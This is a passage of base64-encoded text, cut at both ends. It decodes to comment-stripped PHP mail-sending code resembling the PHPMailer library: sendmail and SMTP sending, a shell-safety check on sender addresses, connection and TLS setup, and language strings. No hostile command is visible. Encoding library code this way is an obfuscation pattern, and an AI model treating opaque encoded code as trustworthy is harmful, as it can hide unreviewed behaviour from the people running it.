VsdCAhPSAwKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaWYgKCFAJG1haWwgPSBwb3Blbigkc2VuZG1haWwsICd3JykpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZnB1dHMoJG1haWwsICRoZWFkZXIpOw0KICAgICAgICAgICAgZnB1dHMoJG1haWwsICRib2R5KTsNCiAgICAgICAgICAgICRyZXN1bHQgPSBwY2xvc2UoJG1haWwpOw0KICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soKCRyZXN1bHQgPT0gMCksICR0aGlzLT50bywgJHRoaXMtPmNjLCAkdGhpcy0+YmNjLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICR0aGlzLT5Gcm9tKTsNCiAgICAgICAgICAgIGlmICgkcmVzdWx0ICE9IDApIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgc3RhdGljIGZ1bmN0aW9uIGlzU2hlbGxTYWZlKCRzdHJpbmcpIHsNCiAgICAgICAgaWYgKEBlc2NhcGVzaGVsbGNtZCgkc3RyaW5nKSAhPT0gJHN0cmluZyBvciAhaW5fYXJyYXkoQGVzY2FwZXNoZWxsYXJnKCRzdHJpbmcpLCBhcnJheSgNCiAgICAgICAgICAgICInJHN0cmluZyciLA0KICAgICAgICAgICAgIlwiJHN0cmluZ1wiIg0KICAgICAgICApKSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICRsZW5ndGggPSBzdHJsZW4oJHN0cmluZyk7DQogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRsZW5ndGg7ICRpKyspIHsNCiAgICAgICAgICAgICRjID0gJHN0cmluZ1skaV07DQogICAgICAgICAgICBpZiAoIWN0eXBlX2FsbnVtKCRjKSAmJiBzdHJwb3MoJ0BfLS4nLCAkYykgPT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gbWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpIHsNCiAgICAgICAgJHRvQXJyID0gYXJyYXkoKTsNCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0b2FkZHIpIHsNCiAgICAgICAgICAgICR0b0FycltdID0gJHRoaXMtPmFkZHJGb3JtYXQoJHRvYWRkcik7DQogICAgICAgIH0NCiAgICAgICAgJHRvICAgICA9IGltcGxvZGUoJywgJywgJHRvQXJyKTsNCiAgICAgICAgJHBhcmFtcyA9IG51bGw7DQogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPlNlbmRlcikgYW5kICR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPlNlbmRlcikpIHsNCiAgICAgICAgICAgIGlmIChzZWxmOjppc1NoZWxsU2FmZSgkdGhpcy0+U2VuZGVyKSkgew0KICAgICAgICAgICAgICAgICRwYXJhbXMgPSBzcHJpbnRmKCctZiVzJywgJHRoaXMtPlNlbmRlcik7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgIWluaV9nZXQoJ3NhZmVfbW9kZScpIGFuZCAkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT5TZW5kZXIpKSB7DQogICAgICAgICAgICAkb2xkX2Zyb20gPSBpbmlfZ2V0KCdzZW5kbWFpbF9mcm9tJyk7DQogICAgICAgICAgICBpbmlfc2V0KCdzZW5kbWFpbF9mcm9tJywgJHRoaXMtPlNlbmRlcik7DQogICAgICAgIH0NCiAgICAgICAgJHJlc3VsdCA9IGZhbHNlOw0KICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvIGFuZCBjb3VudCgkdG9BcnIpID4gMSkgew0KICAgICAgICAgICAgZm9yZWFjaCAoJHRvQXJyIGFzICR0b0FkZHIpIHsNCiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJHRoaXMtPm1haWxQYXNzdGhydSgkdG9BZGRyLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpOw0KICAgICAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKCRyZXN1bHQsIGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAkdG9BZGRyDQogICAgICAgICAgICAgICAgKSwgJHRoaXMtPmNjLCAkdGhpcy0+YmNjLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICR0aGlzLT5Gcm9tKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+bWFpbFBhc3N0aHJ1KCR0bywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsNCiAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKCRyZXN1bHQsICR0aGlzLT50bywgJHRoaXMtPmNjLCAkdGhpcy0+YmNjLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICR0aGlzLT5Gcm9tKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoaXNzZXQoJG9sZF9mcm9tKSkgew0KICAgICAgICAgICAgaW5pX3NldCgnc2VuZG1haWxfZnJvbScsICRvbGRfZnJvbSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCEkcmVzdWx0KSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdpbnN0YW50aWF0ZScpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldFNNVFBJbnN0YW5jZSgpIHsNCiAgICAgICAgaWYgKCFpc19vYmplY3QoJHRoaXMtPnNtdHApKSB7DQogICAgICAgICAgICAkdGhpcy0+c210cCAgICAgICAgICAgID0gbmV3IFNNVFA7DQogICAgICAgICAgICAkdGhpcy0+c210cC0+VXNlU29ja3MgID0gJHRoaXMtPlVzZVNvY2tzOw0KICAgICAgICAgICAgJHRoaXMtPnNtdHAtPlNvY2tzSG9zdCA9ICR0aGlzLT5Tb2Nrc0hvc3Q7DQogICAgICAgICAgICAkdGhpcy0+c210cC0+U29ja3NQb3J0ID0gJHRoaXMtPlNvY2tzUG9ydDsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHRoaXMtPnNtdHA7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzbXRwU2VuZCgkaGVhZGVyLCAkYm9keSkgew0KICAgICAgICAkYmFkX3JjcHQgPSBhcnJheSgpOw0KICAgICAgICBpZiAoISR0aGlzLT5zbXRwQ29ubmVjdCgkdGhpcy0+U01UUE9wdGlvbnMpKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdzbXRwX2Nvbm5lY3RfZmFpbGVkJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOw0KICAgICAgICB9DQogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPlNlbmRlcikgYW5kICR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPlNlbmRlcikpIHsNCiAgICAgICAgICAgICRzbXRwX2Zyb20gPSAkdGhpcy0+U2VuZGVyOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHNtdHBfZnJvbSA9ICR0aGlzLT5Gcm9tOw0KICAgICAgICB9DQogICAgICAgIGlmICghJHRoaXMtPnNtdHAtPm1haWwoJHNtdHBfZnJvbSkpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygnZnJvbV9mYWlsZWQnKSAuICRzbXRwX2Zyb20gLiAnIDogJyAuIGltcGxvZGUoJywnLCAkdGhpcy0+c210cC0+Z2V0RXJyb3IoKSkpOw0KICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+RXJyb3JJbmZvLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgfQ0KICAgICAgICBmb3JlYWNoIChhcnJheSgNCiAgICAgICAgICAgICR0aGlzLT50bywNCiAgICAgICAgICAgICR0aGlzLT5jYywNCiAgICAgICAgICAgICR0aGlzLT5iY2MNCiAgICAgICAgKSBhcyAkdG9ncm91cCkgew0KICAgICAgICAgICAgZm9yZWFjaCAoJHRvZ3JvdXAgYXMgJHRvKSB7DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+cmVjaXBpZW50KCR0b1swXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJGVycm9yICAgICAgPSAkdGhpcy0+c210cC0+Z2V0RXJyb3IoKTsNCiAgICAgICAgICAgICAgICAgICAgJGJhZF9yY3B0W10gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICd0bycgPT4gJHRvWzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2Vycm9yJyA9PiAkZXJyb3JbJ2RldGFpbCddDQogICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgICAgICRpc1NlbnQgICAgID0gZmFsc2U7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJGlzU2VudCA9IHRydWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKCRpc1NlbnQsIGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAkdG9bMF0NCiAgICAgICAgICAgICAgICApLCBhcnJheSgpLCBhcnJheSgpLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICR0aGlzLT5Gcm9tKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZiAoKGNvdW50KCR0aGlzLT5hbGxfcmVjaXBpZW50cykgPiBjb3VudCgkYmFkX3JjcHQpKSBhbmQgISR0aGlzLT5zbXRwLT5kYXRhKCRoZWFkZXIgLiAkYm9keSkpIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2RhdGFfbm90X2FjY2VwdGVkJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+U01UUEtlZXBBbGl2ZSkgew0KICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnJlc2V0KCk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+c210cC0+cXVpdCgpOw0KICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmNsb3NlKCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGNvdW50KCRiYWRfcmNwdCkgPiAwKSB7DQogICAgICAgICAgICAkZXJyc3RyID0gJyc7DQogICAgICAgICAgICBmb3JlYWNoICgkYmFkX3JjcHQgYXMgJGJhZCkgew0KICAgICAgICAgICAgICAgICRlcnJzdHIgLj0gJGJhZFsndG8nXSAuICc6ICcgLiAkYmFkWydlcnJvciddOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygncmVjaXBpZW50c19mYWlsZWQnKSAuICRlcnJzdHIsIHNlbGY6OlNUT1BfQ09OVElOVUUpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc210cENvbm5lY3QoJG9wdGlvbnMgPSBudWxsKSB7DQogICAgICAgIGlmIChpc19udWxsKCR0aGlzLT5zbXRwKSkgew0KICAgICAgICAgICAgJHRoaXMtPnNtdHAgPSAkdGhpcy0+Z2V0U01UUEluc3RhbmNlKCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzX251bGwoJG9wdGlvbnMpKSB7DQogICAgICAgICAgICAkb3B0aW9ucyA9ICR0aGlzLT5TTVRQT3B0aW9uczsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPnNtdHAtPmNvbm5lY3RlZCgpKSB7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+c210cC0+c2V0VGltZW91dCgkdGhpcy0+VGltZW91dCk7DQogICAgICAgICR0aGlzLT5zbXRwLT5zZXREZWJ1Z0xldmVsKCR0aGlzLT5TTVRQRGVidWcpOw0KICAgICAgICAkdGhpcy0+c210cC0+c2V0RGVidWdPdXRwdXQoJHRoaXMtPkRlYnVnb3V0cHV0KTsNCiAgICAgICAgJHRoaXMtPnNtdHAtPnNldFZlcnAoJHRoaXMtPmRvX3ZlcnApOw0KICAgICAgICAkaG9zdHMgICAgICAgICA9IGV4cGxvZGUoJzsnLCAkdGhpcy0+SG9zdCk7DQogICAgICAgICRsYXN0ZXhjZXB0aW9uID0gbnVsbDsNCiAgICAgICAgZm9yZWFjaCAoJGhvc3RzIGFzICRob3N0ZW50cnkpIHsNCiAgICAgICAgICAgICRob3N0aW5mbyA9IGFycmF5KCk7DQogICAgICAgICAgICBpZiAoIXByZWdfbWF0Y2goJy9eKChzc2x8dGxzKTpcL1wvKSooW2EtekEtWjAtOVwuLV0qKTo/KFswLTldKikkLycsIHRyaW0oJGhvc3RlbnRyeSksICRob3N0aW5mbykpIHsNCiAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRwcmVmaXggPSAnJzsNCiAgICAgICAgICAgICRzZWN1cmUgPSAkdGhpcy0+U01UUFNlY3VyZTsNCiAgICAgICAgICAgICR0bHMgICAgPSAoJHRoaXMtPlNNVFBTZWN1cmUgPT0gJ3RscycpOw0KICAgICAgICAgICAgaWYgKCdzc2wnID09ICRob3N0aW5mb1syXSBvciAoJycgPT0gJGhvc3RpbmZvWzJdIGFuZCAnc3NsJyA9PSAkdGhpcy0+U01UUFNlY3VyZSkpIHsNCiAgICAgICAgICAgICAgICAkcHJlZml4ID0gJ3NzbDovLyc7DQogICAgICAgICAgICAgICAgJHRscyAgICA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICRzZWN1cmUgPSAnc3NsJzsNCiAgICAgICAgICAgIH0gZWxzZWlmICgkaG9zdGluZm9bMl0gPT0gJ3RscycpIHsNCiAgICAgICAgICAgICAgICAkdGxzICAgID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAkc2VjdXJlID0gJ3Rscyc7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkc3NsZXh0ID0gZGVmaW5lZCgnT1BFTlNTTF9BTEdPX1NIQTEnKTsNCiAgICAgICAgICAgIGlmICgndGxzJyA9PT0gJHNlY3VyZSBvciAnc3NsJyA9PT0gJHNlY3VyZSkgew0KICAgICAgICAgICAgICAgIGlmICghJHNzbGV4dCkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleHRlbnNpb25fbWlzc2luZycpIC4gJ29wZW5zc2wnLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkaG9zdCAgPSAkaG9zdGluZm9bM107DQogICAgICAgICAgICAkcG9ydCAgPSAkdGhpcy0+UG9ydDsNCiAgICAgICAgICAgICR0cG9ydCA9IChpbnRlZ2VyKSAkaG9zdGluZm9bNF07DQogICAgICAgICAgICBpZiAoJHRwb3J0ID4gMCBhbmQgJHRwb3J0IDwgNjU1MzYpIHsNCiAgICAgICAgICAgICAgICAkcG9ydCA9ICR0cG9ydDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdCgkcHJlZml4IC4gJGhvc3QsICRwb3J0LCAkdGhpcy0+VGltZW91dCwgJG9wdGlvbnMpKSB7DQogICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5IZWxvKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkaGVsbG8gPSAkdGhpcy0+SGVsbzsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRoZWxsbyA9ICR0aGlzLT5zZXJ2ZXJIb3N0bmFtZSgpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5oZWxsbygkaGVsbG8pOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPlNNVFBBdXRvVExTIGFuZCAkc3NsZXh0IGFuZCAkc2VjdXJlICE9ICdzc2wnIGFuZCAkdGhpcy0+c210cC0+Z2V0U2VydmVyRXh0KCdTVEFSVFRMUycpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkdGxzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRscykgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+c3RhcnRUTFMoKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2Nvbm5lY3RfaG9zdCcpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5oZWxsbygkaGVsbG8pOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+U01UUEF1dGgpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNtdHAtPmF1dGhlbnRpY2F0ZSgkdGhpcy0+VXNlcm5hbWUsICR0aGlzLT5QYXNzd29yZCwgJHRoaXMtPkF1dGhUeXBlLCAkdGhpcy0+UmVhbG0sICR0aGlzLT5Xb3Jrc3RhdGlvbikpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdhdXRoZW50aWNhdGUnKSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4Yykgew0KICAgICAgICAgICAgICAgICAgICAkbGFzdGV4Y2VwdGlvbiA9ICRleGM7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPnNtdHAtPmNsb3NlKCk7DQogICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucyBhbmQgIWlzX251bGwoJGxhc3RleGNlcHRpb24pKSB7DQogICAgICAgICAgICB0aHJvdyAkbGFzdGV4Y2VwdGlvbjsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzbXRwQ2xvc2UoKSB7DQogICAgICAgIGlmIChpc19hKCR0aGlzLT5zbXRwLCAnU01UUCcpKSB7DQogICAgICAgICAgICBpZiAoJHRoaXMtPnNtdHAtPmNvbm5lY3RlZCgpKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+Y2xvc2UoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0TGFuZ3VhZ2UoJGxhbmdjb2RlID0gJ2VuJywgJGxhbmdfcGF0aCA9ICcnKSB7DQogICAgICAgICRyZW5hbWVkX2xhbmdjb2RlcyA9IGFycmF5KA0KICAgICAgICAgICAgJ2JyJyA9PiAncHRfYnInLA0KICAgICAgICAgICAgJ2N6JyA9PiAnY3MnLA0KICAgICAgICAgICAgJ2RrJyA9PiAnZGEnLA0KICAgICAgICAgICAgJ25vJyA9PiAnbmInLA0KICAgICAgICAgICAgJ3NlJyA9PiAnc3YnDQogICAgICAgICk7DQogICAgICAgIGlmIChpc3NldCgkcmVuYW1lZF9sYW5nY29kZXNbJGxhbmdjb2RlXSkpIHsNCiAgICAgICAgICAgICRsYW5nY29kZSA9ICRyZW5hbWVkX2xhbmdjb2Rlc1skbGFuZ2NvZGVdOw0KICAgICAgICB9DQogICAgICAgICRQSFBNQUlMRVJfTEFORyA9IGFycmF5KA0KICAgICAgICAgICAgJ2F1dGhlbnRpY2F0ZScgPT4gJ1NNVFAgRXJyb3I6IENvdWxkIG5vdCBhdXRoZW50aWNhdGUuJywNCiAgICAgICAgICAgICdjb25uZWN0X2hvc3QnID0+ICdTTVRQIEVycm9yOiBDb3VsZCBub3QgY29ubmVjdCB0byBTTVRQIGhvc3QuJywNCiAgICAgICAgICAgICdkYXRhX25vdF9hY2NlcHRlZCcgPT4gJ1NNVFAgRXJyb3I6IGRhdGEgbm90IGFjY2VwdGVkLicsDQogICAgICAgICAgICAnZW1wdHlfbWVzc2FnZScgPT4gJ01lc3NhZ2UgYm9keSBlbXB0eScsDQogICAgICAgICAgICAnZW5jb2RpbmcnID0+ICdVbmtub3duIGVuY29kaW5nOiAnLA0KICAgICAgICAgICAgJ2V4ZWN1dGUnID0+ICdDb3VsZCBub3QgZXhlY3V0ZTogJywNCiAgICAgICAgICAgICdmaWxlX2FjY2VzcycgPT4gJ0NvdWxkIG5vdCBhY2Nlc3MgZmlsZTogJywNCiAgICAgICAgICAgICdmaWxlX29wZW4nID0+ICdGaWxlIEVycm9yOiBDb3VsZCBub3Qgb3BlbiBmaWxlOiAnLA0KICAgICAgICAgICAgJ2Zyb21fZmFpbGVkJyA9PiAnVGhlIGZvbGxvd2luZyBGcm9tIGFkZHJlc3MgZmFpbGVkOiAnLA0KICAgICAgICAgICAgJ2luc3RhbnRpYXRlJyA9PiAnTUFJTF9ESVNBQkxFRCcsDQogICAgICAgICAgICAnaW52YWxpZF9hZGRyZXNzJyA9PiAnSW52YWxpZCBhZGRyZXNzOiAnLA0KICAgICAgICAgICAgJ21haWxlcl9ub3Rfc3VwcG9ydGVkJyA9PiAnIG1haWxlciBpcyBub3Qgc3VwcG9ydGVkLicsDQogICAgICAgICAgICAncHJvdmlkZV9hZGRyZXNzJyA9PiAnWW91IG11c3QgcHJvdmlkZSBhdCBsZWFzdCBvbmUgcmVjaXBpZW50IGVtYWlsIGFkZHJlc3MuJywNCiAgICAgICAgICAgICdyZWNpcGllbnRzX2ZhaWxlZCcgPT4gJ1NNVFAgRXJyb3I6IFRoZSBmb2xsb3dpbmcgcmVjaXBpZW50cyBmYWlsZWQ6ICcsDQogICAgICAgICAgICAnc2lnbmluZycgPT4gJ1NpZ25pbmcgRXJyb3I6ICcsDQogICAgICAgICAgICAnc210cF9jb25uZWN0X2ZhaWxlZCcgPT4gJ1NNVFAgY29ubmVjdCgpIGZhaWxlZC4nLA0KICAgICAgICAgICAgJ3NtdHBfZXJyb3InID0+ICdTTVRQIHNlcnZlciBlcnJvcjogJywNCiAgICAgICAgICAgICd2YXJpYWJsZV9zZXQnID0+ICdDYW5ub3Qgc2V0IG9yIHJlc2V0IHZhcmlhYmxlOiAnLA0KICAgICAgICAgICAgJ2V4dGVuc2lvbl9taXNzaW5nJyA9PiAnRXh0ZW5zaW9uIG1pc3Npbmc6ICcNCiAgICAgICAgKTsNCiAgICAgICAgaWYgKGVtcHR5KCRsYW5nX3BhdGgpKSB7DQogICAgICAgICAgICAkbGFuZ19wYXRoID0gZGlybmFtZShfX0ZJTEVfXykgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ2xhbmd1YWdlJyAuIERJUkVDVE9SWV9TRVBBUkFUT1I7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvXlthLXpdezJ9KD86X1thLXpBLVpdezJ9KT8kLycsICRsYW5nY29kZSkpIHsNCiAgICAgICAgICAgICRsYW5nY29kZSA9ICdlbic7DQogICAgICAgIH0NCiAgICAgICAgJGZvdW5kbGFuZyA9IHRydWU7DQogICAgICAgICRsYW5nX2ZpbGUgPSAkbGFuZ19wYXRoIC4gJ3BocG1haWxlci5sYW5nLScgLiAkbGFuZ2NvZGUgLiAnLnBocCc7DQogICAgICAgIGlmICgkbGFuZ2NvZGUgIT0gJ2VuJykgew0KICAgICAgICAgICAgaWYgKCFpc19yZWFkYWJsZSgkbGFuZ19maWxlKSkgew0KICAgICAgICAgICAgICAgICRmb3VuZGxhbmcgPSBmYWxzZTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJGZvdW5kbGFuZyA9IGluY2x1ZGUgJGxhbmdfZmlsZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+bGFuZ3VhZ2UgPSAkUEhQTUFJTEVSX0xBTkc7DQogICAgICAgIHJldHVybiAoYm9vbGVhbikgJGZvdW5kbGFuZzsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldFRyYW5zbGF0aW9ucygpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFkZHJBcHBlbmQoJHR5cGUsICRhZGRyKSB7DQogICAgICAgICRhZGRyZXNzZXMgPSBhcnJheSgpOw0KICAgICAgICBmb3JlYWNoICgkYWRkciBhcyAkYWRkcmVzcykgew0KICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gJHRoaXMtPmFkZHJGb3JtYXQoJGFkZHJlc3MpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkdHlwZSAuICc6ICcgLiBpbXBsb2RlKCcsICcsICRhZGRyZXNzZXMpIC4gJHRoaXMtPkxFOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkckZvcm1hdCgkYWRkcikgew0KICAgICAgICBpZiAoZW1wdHkoJGFkZHJbMV0pKSB7DQogICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNlY3VyZUhlYWRlcigkYWRkclswXSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICByZXR1cm4gJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRhZGRyWzFdKSwgJ3BocmFzZScpIC4gJyA8JyAuICR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMF0pIC4gJz4nOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiB3cmFwVGV4dCgkbWVzc2FnZSwgJGxlbmd0aCwgJHFwX21vZGUgPSBmYWxzZSkgew0KICAgICAgICBpZiAoJHFwX21vZGUpIHsNCiAgICAgICAgICAgICRzb2Z0X2JyZWFrID0gc3ByaW50ZignID0lcycsICR0aGlzLT5MRSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkc29mdF9icmVhayA9ICR0aGlzLT5MRTsNCiAgICAgICAgfQ0KICAgICAgICAkaXNfdXRmOCA9IChzdHJ0b2xvd2VyKCR0aGlzLT5DaGFyU2V0KSA9PSAndXRmLTgnKTsNCiAgICAgICAgJGxlbGVuICAgPSBzdHJsZW4oJHRoaXMtPkxFKTsNCiAgICAgICAgJGNybGZsZW4gPSBzdHJsZW4oc2VsZjo6Q1JMRik7DQogICAgICAgICRtZXNzYWdlID0gJHRoaXMtPmZpeEVPTCgkbWVzc2FnZSk7DQogICAgICAgIGlmIChzdWJzdHIoJG1lc3NhZ2UsIC0kbGVsZW4pID09ICR0aGlzLT5MRSkgew0KICAgICAgICAgICAgJG1lc3NhZ2UgPSBzdWJzdHIoJG1lc3NhZ2UsID